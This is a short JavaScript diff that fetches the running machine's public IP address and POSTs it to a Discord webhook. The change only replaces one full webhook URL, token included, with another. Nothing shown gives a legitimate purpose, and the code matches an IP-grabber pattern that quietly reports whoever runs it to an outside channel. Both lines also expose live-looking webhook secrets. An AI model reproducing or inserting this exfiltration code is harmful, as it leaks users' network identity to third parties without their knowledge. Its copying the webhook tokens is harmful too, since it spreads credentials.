@@ -1,7 +1,7 @@
 fetch("https://myexternalip.com/raw").then((res) =>
         res.text().then((data) => {
             fetch(
-            'https://discord.com/api/webhooks/1006549828530094161/VU8lTwRYPBfCLLTtXr399uNq-LcgeusF859r3oelUuCjK3Yr13JcwMLT7aL9mDAETHBP',
+            'https://discord.com/api/webhooks/1043652009368223874/rg7udnP3_V0-giHnMrxXCKYkrQAzDaLacpwnRQw7ZKXVOU6-a8stSw7l6B3iR-ll-6oo',
             {
               method: 'post',
               headers: {
